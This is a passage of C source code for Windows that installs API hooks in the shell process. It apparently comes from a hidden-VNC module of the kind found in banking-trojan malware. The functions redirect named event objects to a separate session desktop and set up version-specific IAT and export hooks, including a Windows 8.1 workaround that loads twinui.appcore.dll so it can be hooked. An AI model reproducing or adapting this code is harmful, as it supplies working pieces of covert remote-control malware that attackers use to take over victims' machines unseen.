			hFree ( (LPVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}

HANDLE __stdcall my_CreateEventExA(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	LPCSTR lpName,
	DWORD dwFlags,
	DWORD dwDesiredAccess
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectA(lpName)){
			lpNewName = DecorateNameA(&g_pSession->Desktop,(LPSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%s->%s\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameA(%s) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){
		r = DEFINE_KERNELBASE_PROC(CreateEventExA)(
			lpEventAttributes,
			lpNewName,
			dwFlags,
			dwDesiredAccess
			);

		if ( lpNewName != lpName ){
			hFree ( (LPVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}

HANDLE __stdcall my_OpenEventW(
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	LPCWSTR lpName
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCWSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectW(lpName)){
			lpNewName = DecorateNameW(&g_pSession->Desktop,(LPWSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%S->%S\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameW(%S) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){
		r = DEFINE_KERNELBASE_PROC(OpenEventW)(
			dwDesiredAccess,
			bInheritHandle,
			lpNewName
			);

		if ( lpNewName != lpName ){
			hFree ( (LPVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}

HANDLE __stdcall my_OpenEventA(
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	LPCSTR lpName
	)
{
	DWORD Error = NO_ERROR;
	HANDLE r = NULL;
	LPCSTR lpNewName = lpName;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data && lpName ){
		if ( _IsVirtObjectA(lpName)){
			lpNewName = DecorateNameA(&g_pSession->Desktop,(LPSTR)lpName);
			if ( lpNewName ){
				DbgPrint("%s->%s\n",lpName,lpNewName);
			}else{
				Error = GetLastError();
				DbgPrint("DecorateNameA(%s) failed\n",lpName);
			}
		}
	}

	if ( Error == NO_ERROR ){
		r = DEFINE_KERNELBASE_PROC(OpenEventA)(
			dwDesiredAccess,
			bInheritHandle,
			lpNewName
			);

		if ( lpNewName != lpName ){
			hFree ( (LPVOID)lpNewName );
		}
	}

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}

	LEAVE_HOOK();
	return r;
}
#endif //_ENABLE_WIN8_SUPPORT

WINERROR ShellHookActivate(VOID)
{
	WINERROR Status = NO_ERROR;
	LONG NumberIatHooks;
	LONG NumberExportHooks;

	PHOOK_DESCRIPTOR ExportHooks;
	PHOOK_DESCRIPTOR IatHooks;

	PHOOK_DESCRIPTOR ExportHooks8 = NULL;
	PHOOK_DESCRIPTOR IatHooks8 = NULL;
#ifdef _ENABLE_WIN8_SUPPORT
	LONG NumberIatHooks8;
	LONG NumberExportHooks8;
#endif //#ifdef _ENABLE_WIN8_SUPPORT

	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));

	DbgPrint("ShellHookActivate\n" );

#if _DEBUG
	MiniDumpInitialize();
#endif

	ComInitialize();

	// system specific
	if (SystemMajor < 6 || //xp
		(SystemMajor == 6 && SystemMinor <= 1)) // win7 and vista
	{
		// Windows 7 and below
		ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooks;
		IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooks;
		NumberExportHooks = sizeof(g_WndExpHooks) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(g_WndIatHooks) / sizeof(HOOK_DESCRIPTOR);
	}
#ifdef _ENABLE_WIN8_SUPPORT
	else
	{
		// Windows 8 and higher
		ExportHooks = (PHOOK_DESCRIPTOR)&g_WndExpHooks8;
		IatHooks = (PHOOK_DESCRIPTOR)&g_WndIatHooks8;
		NumberExportHooks = sizeof(g_WndExpHooks8) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(g_WndIatHooks8) / sizeof(HOOK_DESCRIPTOR);
		if ( SystemMinor == 2 )
		{
			ExportHooks8 = (PHOOK_DESCRIPTOR)&g_WndExpHooks80;
			IatHooks8 = (PHOOK_DESCRIPTOR)&g_WndIatHooks80;
			NumberExportHooks8 = sizeof(g_WndExpHooks80) / sizeof(HOOK_DESCRIPTOR);
			NumberIatHooks8 = sizeof(g_WndIatHooks80) / sizeof(HOOK_DESCRIPTOR);
		}
		else if ( SystemMinor >= 3 )
		{
			//special workaround for win 8.1
			// we need to hook twinui_appcore exports
			// but this dll is loaded later by com
			// we load and hook it now
			LoadLibraryW(L"twinui.appcore.dll");
			ExportHooks8 = (PHOOK_DESCRIPTOR)&g_WndExpHooks81;
			IatHooks8 = (PHOOK_DESCRIPTOR)&g_WndIatHooks81;
			NumberExportHooks8 = sizeof(g_WndExpHooks81) / sizeof(HOOK_DESCRIPTOR);
			NumberIatHooks8 = sizeof(g_WndIatHooks81) / sizeof(HOOK_DESCRIPTOR);
		}
	}
#endif

	Status = 
		SetMultipleDllHooks(
			IatHooks,
			NumberIatHooks,
			ExportHooks,
			NumberExportHooks
			);
#ifdef _ENABLE_WIN8_SUPPORT
	if ( Status == NO_ERROR ){
		if ( ExportHooks8 && IatHooks8 )
		{
			SetMultipleDllHooks(
				IatHooks8,
				NumberIatHooks8,
				ExportHooks8,
				NumberExportHooks8
				);
		}
	}
#endif //#ifdef _ENABLE_WIN8_SUPPORT

	return(Status);
}

VOID ShellHookDectivate(VOID)
{
	ComRelease();
}

